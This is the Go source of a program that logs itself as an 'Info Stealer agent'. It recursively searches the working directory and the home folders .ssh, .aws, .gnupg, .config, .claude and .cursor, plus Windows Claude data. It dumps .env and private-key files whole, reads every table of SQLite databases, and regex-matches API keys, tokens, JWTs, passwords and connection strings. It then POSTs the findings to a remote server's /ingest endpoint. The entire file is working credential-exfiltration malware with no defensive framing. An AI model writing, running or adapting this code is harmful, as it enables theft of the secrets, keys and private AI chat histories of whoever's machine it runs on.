package main

import (
	"bufio"
	"bytes"
	"database/sql"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"slices"
	"strings"

	"github.com/ledongthuc/pdf"
	"github.com/xuri/excelize/v2"
	_ "modernc.org/sqlite"
)

// slice of file extensions that we will explicitly scan through
var TARGET_FILE_EXTENSIONS []string = []string{
	".pdf",
	".txt",
	".xlsx",
	".csv",
	".json",
	".jsonl", // Claude chat history
	".env",
	".yaml",
	".yml",
	".pem",
	".key",
	".py",
	".go",
	".js",
	".jsx",
	".c",
	".cpp",
	".db",
	".sqlite",
	".md",
}

// obvious red flags, look at no matter what if a file has this in the filename
var RED_FLAGS []string = []string{
	"credentials",
	"creds",
	"token",
	"password",
	"id_rsa",
}

// slice of some symlink paths that could be valuable
var HIGH_LEVEL_PATHS []string = []string{
	".ssh",
	".aws",
	".config",
	".gnupg",
	".claude",
	"jan",
}

// slice of folder names to exclude because it will be unrelated noise
var EXCLUDED_DIR_NAMES []string = []string{
	"node_modules",
	"static",
	"staticfiles",
	"lib",
}

// slice of files found that we will scan
var susFiles []string

type pattern struct {
	credType string
	re       *regexp.Regexp
}

var patterns = []pattern{
	{"email", regexp.MustCompile(`([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)`)},
	{"ip", regexp.MustCompile(`\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b`)},
	{"aws-access-key", regexp.MustCompile(`AKIA[0-9A-Z]{16}`)},
	{"github-pat", regexp.MustCompile(`ghp_[A-Za-z0-9]{36}`)},
	{"github-pat-fine-grained", regexp.MustCompile(`github_pat_[A-Za-z0-9_]{82}`)},
	{"openai-key", regexp.MustCompile(`sk-[A-Za-z0-9]{48}|sk-proj-[A-Za-z0-9_\-]+`)},
	{"anthropic-key", regexp.MustCompile(`sk-ant-[A-Za-z0-9\-_]{90,}`)},
	{"google-api-key", regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`)},
	{"stripe-live-key", regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24}`)},
	{"slack-token", regexp.MustCompile(`xox[bpra]-[0-9A-Za-z\-]+`)},
	{"discord-token", regexp.MustCompile(`[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}`)},
	{"sendgrid-key", regexp.MustCompile(`SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}`)},
	{"private-key-header", regexp.MustCompile(`-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----`)},
	{"credential-assignment", regexp.MustCompile(`(?i)(?:password|passwd|secret|api_key|apikey|token|auth)\s*[=:]\s*\S{6,}`)},
	{"connection-string", regexp.MustCompile(`(?:postgres|mysql|mongodb|redis|amqp):\/\/[^:\s]+:[^@\s]+@[^\s]+`)},
	{"jwt", regexp.MustCompile(`eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`)},
}

type Info struct {
	CredType       string   `json:"credType"`
	Content        string   `json:"content"`
	FileContaining []string `json:"fileContaining"`
	Count          int      `json:"count"`
}

var foundInfo []Info

// WalkThrough walks through the current working directory and takes note of files to scan.
// it will then step down into another directory to continue looking.
func WalkThrough(cwd string) {
	entries, err := os.ReadDir(cwd)
	if err != nil {
		log.Println("unable to read dir", cwd)
		return
	}
	for _, v := range entries {
		name := v.Name()
		path := filepath.Join(cwd, name)
		if v.IsDir() && !slices.Contains(EXCLUDED_DIR_NAMES, name) {
			WalkThrough(path)
		} else if slices.Contains(HIGH_LEVEL_PATHS, name) {
			// this section checks for symlinks that aren't caught by v.IsDir()
			// os.Stat() will successfully catch if it's a symlink dir so we use that
			info, err := os.Stat(path)
			if err == nil && info.IsDir() {
				WalkThrough(path)
			}
		} else if slices.Contains(TARGET_FILE_EXTENSIONS, filepath.Ext(name)) {
			susFiles = append(susFiles, path)
		} else {
			// let's check if the name is a substring of anything in the RED_FLAGS slice
			for _, rf := range RED_FLAGS {
				if strings.Contains(strings.ToLower(name), rf) {
					susFiles = append(susFiles, path)
					break
				}
			}
		}
	}
}

const (
	maxFileSizeBytes    = 5 * 1024 * 1024 // skip files larger than 5 MB
	maxFullContentBytes = 8 * 1024        // cap full-dump content at 8 KB
	maxScannerToken     = 512 * 1024      // max line size for bufio.Scanner
)

// ScanFile looks through each file matching on regex patterns for emails, IP addresses, passwords, etc.
// any matches are written to a slice
func ScanFile(fname string) []Info {
	found := map[string]Info{}

	stat, err := os.Stat(fname)
	if err != nil {
		return nil
	}
	if stat.Size() > maxFileSizeBytes {
		log.Printf("[!] skipping %s: %.1f MB exceeds limit", fname, float64(stat.Size())/(1024*1024))
		return nil
	}

	fExt := filepath.Ext(fname)
	var redFlagFound bool

	for _, rf := range RED_FLAGS {
		if strings.Contains(strings.ToLower(fname), rf) {
			redFlagFound = true
			break
		}
	}
	var fReader io.Reader

	if fExt == ".env" || fExt == ".pem" || fExt == ".key" {
		content, err := os.ReadFile(fname)
		if err != nil {
			log.Println("[!] unable to read file:", err.Error())
			return nil
		}
		if len(content) > maxFullContentBytes {
			content = content[:maxFullContentBytes]
		}
		credType := map[string]string{
			".env": "env-dump",
			".pem": "private-key",
			".key": "private-key",
		}[fExt]
		found["fullcontent"] = Info{CredType: credType, Content: string(content), FileContaining: []string{fname}, Count: 1}
		fReader = strings.NewReader(string(content))
	} else if redFlagFound {
		content, err := os.ReadFile(fname)
		if err != nil {
			log.Println("[!] unable to read file:", err.Error())
			return nil
		}
		if len(content) > maxFileSizeBytes {
			content = content[:maxFileSizeBytes]
		}
		credType := "other"
		found["fullcontent"] = Info{CredType: credType, Content: string(content), FileContaining: []string{fname}, Count: 1}
		fReader = strings.NewReader(string(content))

	} else if fExt == ".pdf" {
		f, fPdfReader, err := pdf.Open(fname)
		if err != nil {
			log.Println("[!] unable to open", f.Name()+":", err.Error())
			return nil
		}
		fReader, err = fPdfReader.GetPlainText()
		if err != nil {
			log.Println("[!] unable to create reader on pdf file:", err.Error())
		}
	} else if fExt == ".csv" {
		f, err := os.Open(fname)
		if err != nil {
			log.Println("unable to open csv file:", err.Error())
			return nil
		}
		rows, err := csv.NewReader(f).ReadAll()
		if err != nil {
			log.Println("unable to read the csv file", err.Error())
			return nil
		}
		var sb strings.Builder
		for _, row := range rows {
			sb.WriteString(strings.Join(row, " ") + "\n")
		}
		fReader = strings.NewReader(sb.String())
	} else if fExt == ".db" || fExt == ".sqlite" {
		db, err := sql.Open("sqlite", fname)
		if err != nil {
			log.Println("unable to open sqlite db:", err.Error())
			return nil
		}
		defer db.Close()

		tableRows, err := db.Query("SELECT name FROM sqlite_master WHERE type='table'")
		if err != nil {
			log.Println("unable to read sqlite_master:", err.Error())
			return nil
		}
		var tables []string
		for tableRows.Next() {
			var t string
			if tableRows.Scan(&t) == nil {
				tables = append(tables, t)
			}
		}
		tableRows.Close()

		var sb strings.Builder
		for _, table := range tables {
			rows, err := db.Query(fmt.Sprintf(`SELECT * FROM "%s"`, table))
			if err != nil {
				continue
			}
			cols, _ := rows.Columns()
			vals := make([]any, len(cols))
			ptrs := make([]any, len(cols))
			for i := range vals {
				ptrs[i] = &vals[i]
			}
			for rows.Next() {
				if rows.Scan(ptrs...) != nil {
					continue
				}
				for _, v := range vals {
					switch s := v.(type) {
					case string:
						sb.WriteString(s + "\n")
					case []byte:
						sb.WriteString(string(s) + "\n")
					}
				}
			}
			rows.Close()
		}
		fReader = strings.NewReader(sb.String())
	} else if fExt == ".xlsx" {
		xlFile, err := excelize.OpenFile(fname)
		if err != nil {
			log.Println("unable to open xlsx file", err.Error())
			return nil
		}
		var sb strings.Builder
		for _, sheet := range xlFile.GetSheetList() {
			rows, err := xlFile.GetRows(sheet)
			if err != nil {
				continue
			}
			for _, row := range rows {
				sb.WriteString(strings.Join(row, " ") + "\n")
			}
		}
		fReader = strings.NewReader(sb.String())
	} else {
		// plaintext
		f, err := os.Open(fname)
		if err != nil {
			log.Println("[!] unable to open", f.Name()+":", err.Error())
			return nil
		}
		fReader = bufio.NewReader(f)
	}

	upsert := func(credType, match string) {
		key := credType + "|" + match
		if existing, ok := found[key]; ok {
			existing.Count++
			found[key] = existing
		} else {
			found[key] = Info{CredType: credType, Content: match, FileContaining: []string{fname}, Count: 1}
		}
	}

	scanner := bufio.NewScanner(fReader)
	scanner.Buffer(make([]byte, maxScannerToken), maxScannerToken)
	for scanner.Scan() {
		line := scanner.Text()
		for _, p := range patterns {
			for _, match := range p.re.FindAllString(line, -1) {
				upsert(p.credType, match)
			}
		}
	}

	result := make([]Info, 0, len(found))
	for _, v := range found {
		result = append(result, v)
	}
	return result
}

// getTargetPaths returns a list of high-value absolute paths to always scan,
// regardless of where the binary is run from.
func getTargetPaths() []string {
	home, err := os.UserHomeDir()
	if err != nil {
		log.Println("unable to get home dir:", err.Error())
		return nil
	}

	// paths relative to home that exist on all platforms
	homePaths := []string{
		".ssh", ".aws", ".gnupg", ".claude", ".config",
		"jan", ".continue", ".cursor",
	}

	var paths []string
	for _, rel := range homePaths {
		p := filepath.Join(home, rel)
		if _, err := os.Stat(p); err == nil {
			paths = append(paths, p)
		}
	}

	if runtime.GOOS == "windows" {
		appdata := os.Getenv("APPDATA")
		if appdata != "" {
			// should grab Claude logs from windows
			for _, sub := range []string{"Claude", filepath.Join("Code", "User")} {
				p := filepath.Join(appdata, sub)
				if _, err := os.Stat(p); err == nil {
					paths = append(paths, p)
				}
			}
		}
	}

	return paths
}

func sendFindings(serverURL string, batch []Info) {
	if serverURL == "" || len(batch) == 0 {
		return
	}
	data, err := json.Marshal(batch)
	if err != nil {
		log.Println("[!] failed to marshal findings:", err)
		return
	}
	resp, err := http.Post(serverURL+"/ingest", "application/json", bytes.NewReader(data))
	if err != nil {
		log.Println("[!] failed to send findings:", err)
		return
	}
	resp.Body.Close()
}

func main() {
	serverURL := flag.String("server", "", "findings server URL (e.g. http://localhost:8080)")
	rootFlag := flag.String("root", "", "root directory to scan (defaults to cwd)")
	flag.Parse()

	fo, err := os.Create("agent.log")
	if err == nil {
		log.SetOutput(fo)
	}
	log.Println("Info Stealer agent started...")

	rootDir := *rootFlag
	if rootDir == "" {
		rootDir, err = os.Getwd()
		if err != nil {
			log.Fatalln("unable to get working dir")
		}
	}

	log.Println("Starting walkthrough with the root at", rootDir)
	WalkThrough(rootDir)

	for _, p := range getTargetPaths() {
		log.Println("Scanning high-value path:", p)
		WalkThrough(p)
	}

	log.Println("Found", len(susFiles), "files to scan. Scanning now")
	globalFound := map[string]Info{}
	for _, file := range susFiles {
		results := ScanFile(file)
		sendFindings(*serverURL, results)
		for _, info := range results {
			key := info.CredType + "|" + info.Content
			if existing, ok := globalFound[key]; ok {
				existing.Count += info.Count
				existing.FileContaining = append(existing.FileContaining, info.FileContaining...)
				globalFound[key] = existing
			} else {
				globalFound[key] = info
			}
		}
	}
	for _, v := range globalFound {
		foundInfo = append(foundInfo, v)
	}

	log.Println(foundInfo)
}
